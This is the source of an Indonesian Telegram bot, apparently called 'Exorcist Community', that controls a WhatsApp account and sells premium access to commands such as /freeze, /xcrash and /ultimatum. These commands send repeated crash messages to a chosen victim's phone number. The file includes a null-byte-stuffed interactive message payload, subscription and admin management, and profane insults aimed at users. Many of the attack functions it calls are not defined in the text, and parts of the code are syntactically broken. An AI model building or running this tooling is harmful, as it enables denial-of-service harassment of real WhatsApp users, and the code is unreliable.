const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const JsConfuser = require('js-confuser');
const {
    default: makeWACosmoXet,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaconnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WACosmoXet,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    encodeSignedDeviceIdentity,
    encodeWAMessage,
    jidEncode,
    patchMessageBeforeSending,
    encodeNewsletterMessage, 
} = require('xatabail');
const pino = require('pino');
const chalk = require('chalk');
const moment = require('moment-timezone');
const { BOT_TOKEN, allowedDevelopers } = require("./TokenId/config");
const crypto = require('crypto');
const ZeppImg = fs.readFileSync('./k.jpg');
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

const axios = require('axios');

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/Putraahere/DatabaseV3/refs/heads/main/tokens.json";

async function fetchValidTokens() {
  try {
    const res = await axios.get(GITHUB_TOKEN_LIST_URL, {
      timeout: 5000,
      validateStatus: s => s === 200
    });

    if (
      !res.data ||
      typeof res.data !== "object" ||
      !Array.isArray(res.data.tokens)
    ) {
      throw new Error("DATABASE TOKEN TIDAK VALID");
    }

    const tokens = res.data.tokens.filter(
      t => typeof t === "string" && t.length > 10
    );

    if (tokens.length === 0) {
      throw new Error("DATABASE TOKEN KOSONG");
    }

    console.log(chalk.green("✅ Database token valid"));
    return tokens;

  } catch (e) {
    console.error(chalk.red("❌ GAGAL MENGAKSES DATABASE TOKEN"));
    console.error(chalk.red(e.message));
    return null;
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token...\n"));

  if (!BOT_TOKEN || typeof BOT_TOKEN !== "string") {
    console.error(chalk.red("❌ TOKEN TIDAK DISET / INVALID"));
    return false;
  }

  const tokens = await fetchValidTokens();
  if (!tokens) return false;

  if (!tokens.includes(BOT_TOKEN.trim())) {
    console.log(chalk.red(`
═════════════════════
⛔ TOKEN TIDAK TERDAFTAR
═════════════════════
AKSES DITOLAK
`));
    return false;
  }

  console.log(chalk.green("✅ TOKEN VALID\n"));
  return true;
}

function startBot() {
  console.log(chalk.bold.red(`
» Information:
☇ Developer : Ryanzz
☇ Script    : Exorcist Community
☇ Version   : 2.0
`));
}

(async () => {
  const isValid = await validateToken();
  if (!isValid) return; 
  startBot();
})();


// --- Variabel Global ---
let sock = null;
let isWhatsAppconnected = false;
const usePairingCode = true; // Tidak digunakan dalam kode Anda
let maintenanceConfig = {
    maintenance_mode: false,
    message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./BaseCloud/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./BaseCloud/premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./BaseCloud/ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
┏─────────────────
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
┗─────────────────`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./BaseCloud/userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./BaseCloud/userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Lo siapa ngentot? Kalo belum punya akses minta add dlu ya dekk.");
    }
};

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    sock = makeWACosmoXet(connectionOptions);

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
       
            isWhatsAppconnected = true;
            console.log(chalk.white.bold(`
┏─────────────────
┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
┗─────────────────`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
┏─────────────────
┃   ${chalk.red.bold('WHATSAPP DISCONNECT')}
┗─────────────────`),
                shouldReconnect ? chalk.white.bold(`
┏─────────────────
┃   ${chalk.red.bold('RECONNECTING AGAIN')}
┗─────────────────`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppconnected = false;
        }
    });
}

(async () => {
    console.log(chalk.whiteBright.bold(`
┏─────────────────
┃ ${chalk.yellowBright.bold('SYSTEM ANTI CRACK ACTIVE')}
┗─────────────────`));

    console.log(chalk.white.bold(`
┏━━━━━━─────────────────
┃ ${chalk.yellow.bold('SUKSES MEMUAT DATABASE OWNER')}
┗━━━━━━─────────────────`));

    loadPremiumUsers();
    loadAdmins();
    loadDeviceList();
    loadUserActivity();

    // Menambahkan device ke ListDevice.json saat inisialisasi
    addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();
// --- Command Handler ---

// Command untuk pairing WhatsApp
bot.command("xconnect", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id && !isAdmin(ctx.from.id))) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /xconnect <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    if (!phoneNumber.startsWith('62')) {
        return await ctx.reply("❌ Nomor harus diawali dengan 62. Contoh: /xconnect 62𝐗𝐗𝐗");
    }

    if (sock && sock.user) {
        return await ctx.reply("ℹ️ WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await sock.requestPairingCode(phoneNumber, "EXOCMNTY");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
*✅ Kode pairing mu lek*

*Nomor:* ${phoneNumber}
*Kode:* \`${formattedCode}\`
        `;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
    }

    if (ownerList.includes(userId)) {
        return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
    }

    ownerList.push(userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /delowner - Menghapus owner
bot.command("delowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
    }

    if (!ownerList.includes(userId)) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
    }

    ownerList = ownerList.filter(id => id !== userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner tersebut tidak lagi memiliki akses seperti owner.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addadmin <id_user>");
    }

    addAdmin(userId);

    const successMessage = `
✅ Si Anjing dengan ID *${userId}* berhasil ditambahkan sebagai *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin baru sekarang memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
    }

    removeAdmin(userId);

    const successMessage = `
✅ Si Anjing dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Callback Query untuk Menampilkan Daftar Admin
bot.action("listadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Lu siapa kontol?");
    }

    const adminListString = adminList.length > 0
        ? adminList.map(id => `- ${id}`).join("\n")
        : "Tidak ada admin yang terdaftar.";

    const message = `
ℹ️ List Babu Admin:

${adminListString}

Total: ${adminList.length} admin.
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addprem <id_user> <durasi_hari>");
    }

    const userId = args[1];
    const durationDays = parseInt(args[2]);

    if (isNaN(durationDays) || durationDays <= 0) {
        return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
    }

    addPremiumUser(userId, durationDays);

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

    const successMessage = `
✅ Si Kontol dengan ID *${userId}* berhasil ditambahkan sebagai *Premium User*.

*Detail:*
- *ID User:* ${userId}
- *Durasi:* ${durationDays} hari
- *Kadaluarsa:* ${formattedExpiration} WIB

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Cek Status Premium", callback_data: `cekprem_${userId}` }]
            ]
        }
    });
});

// Command /delprem - Menghapus user premium
bot.command("delprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delprem <id_user>");
    }

    if (!premiumUsers[userId]) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    removePremiumUser(userId);

    const successMessage = `
✅ Si Kontol dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.

*Detail:*
- *ID User:* ${userId}

User tersebut tidak lagi memiliki akses ke fitur premium.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }

    if (!premiumUsers[userId]) {
        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();

    const message = `
ℹ️ Status Si Peler *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
    const totalDevices = deviceList.length;
    const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

    await ctx.replyWithMarkdown(deviceMessage);
});

// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userList = "";
    for (const userId in userActivity) {
        const user = userActivity[userId];
        userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
    }

    const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

    await ctx.replyWithMarkdown(message);
});

// --- Contoh Command dan Middleware ---
const prosesrespone = async (target, ctx) => {
  
    const ProsesColi = `
✦━━〔 EXORCIST COMMUNITY ━━✦

☠ 𝗦𝗧𝗔𝗧𝗨𝗦
↳ Bug telah berhasil dikirim ke target ritual

🩸 𝗡𝗢𝗧𝗘
↳ Tunggu ±5 menit sebelum pengiriman ulang
↳ Biarkan entitas pengirim tetap tersembunyi

⛧ 𝗗𝗜𝗧𝗔𝗡𝗗𝗔𝗜
↳ Oleh entitas gelap: EXO 🕷️

✦━━━━━━━━━━━━━━━━━━━━━✦  `;

    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: ProsesColi,
      parse_mode: "HTML"
    })
};

const donerespone = async (target, ctx) => {
  
    const SuksesCrot = `
✦━━〔 EXORCIST COMMUNITY ━━✦

☠ 𝗦𝗧𝗔𝗧𝗨𝗦
↳ Bug telah berhasil dikirim ke target ritual

🩸 𝗡𝗢𝗧𝗘
↳ Tunggu ±5 menit sebelum pengiriman ulang
↳ Biarkan entitas pengirim tetap tersembunyi

⛧ 𝗗𝗜𝗧𝗔𝗡𝗗𝗔𝗜
↳ Oleh entitas gelap: EXO 🕷️

✦━━━━━━━━━━━━━━━━━━━━━✦
    `;

    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: SuksesCrot,
      parse_mode: "HTML", 
      replyMarkup =
       { inline_keyboard: [[{ text: "Back - Menu !", callback_data: "bugmenux" }]]
    });
};

const checkWhatsAppconnection = async (ctx, next) => {
    if (!isWhatsAppconnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /xconnect");
        return;
    }
    await next();
};

const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance

///Function Bug\\\


// --- Command /crash (Placeholder for your actual crash functions) ---
bot.command("easydelay", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 100; i++) {
      await despiczy(target);
      await TrueNullv3(target);
    }

    await donerespone(target, ctx);
});

bot.command("freeze", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 50; i++) {
      await HxDZiaoXang(target);
      await sleep(1000);
      await FreezeChat(target);
      await sleep(1000);
      await frezeeClick(target);
      await sleep(1000);
      await HxDPrince(target);
      await sleep(1000);
      await HxDZiaoXang(target);
      await sleep(1000) 
    }

    await donerespone(target, ctx);
});

bot.command("drain", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

     for (let i = 0; i < 100; i++) {
     await Truenullv4(target, ptcp = true);
     await XStromBulldozerX(target, true);
     }

    await donerespone(target, ctx);
});

bot.command("xcrash", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 10; i++) {
      await Crash(target, true);
      await sleep(1000);
      await amountOne(target, true);
      await sleep(1000);
      await nullExc(target, true);
      await sleep(1000);
    }

    await donerespone(target, ctx);
});

bot.command("combo", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 35; i++) {
      await nullExc(target, true);
      await Truenullv4(target, ptcp = true);
      await HxDZiaoXang(target);
      await Crash(target, true)
    }

    await donerespone(target, ctx);
});

bot.command("hardelay", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 50; i++) {
     await tesfang(target);
              await sleep(1000);
     await locaDelay(target);
              await sleep(1000);
              await buttonDelay(target);
              await sleep(1000);
    }

    await donerespone(target, ctx);
});

bot.command("rimuru", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];
              const delay = (ms) => new Promise(res => setTimeout(res, ms));
              const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 50; i++) {
      await delayvisibSpam(target, true);
      await SlowDelay();
      await Truenullv4(target, ptcp = true);
      await SlowDelay();
      await TrueNullv3(target);
      await SlowDelay();
    }

    await donerespone(target, ctx);
});

bot.command("viora", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 50; i++) {
     await XvZDonger(target);
              await sleep(1000);
     await juleenakah(target);
              await sleep(1000);
              await gacorbgklz(target);
              await sleep(1000);
              await gacorbgklz(target);
              await sleep(1000);           
    }

    await donerespone(target, ctx);
});

bot.command("ultimate", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 50; i++) {
     await packBlank(target);
              await sleep(1000);
     await blanknih(target);
              await sleep(1000);
              await Sparkblank(target);
              await sleep(1000);
              await blankxzvr(target);
              await sleep(1000);
              await InvisCall(target);
              await sleep(1000);
              await CrashHit(target);
              await sleep(1000);
    }

    await donerespone(target, ctx);
});

bot.command("ultimatum", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 50; i++) {
     await Notifcrash(target);
              await sleep(1000);
     await HxDClaws(target);
              await sleep(1000);
              await HardLocUI(target);
              await sleep(1000);
              await zwspCrashUi(target);
              await sleep(1000);
              await NotifUI(target);
              await sleep(1000);
              await Uipayload(target);
              await sleep(1000);
              await galleryBugUI(target);
              await sleep(1000);
              await LocaliveUI(target);
              await sleep(1000);
    }

    await donerespone(target, ctx);
});

bot.command("vasion", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 50; i++) {
      await TrueIos(target);
      await ZenoIosExe(target);
      await docIos(target);
      await ioszzz(target);
      await CtcBizArray(target);
      await rpnm(target);
    }

    await donerespone(target, ctx);
});
//Fungsi Untuk Menghapus Bug
bot.command("clearbug", checkWhatsAppconnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 1; i++) {
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
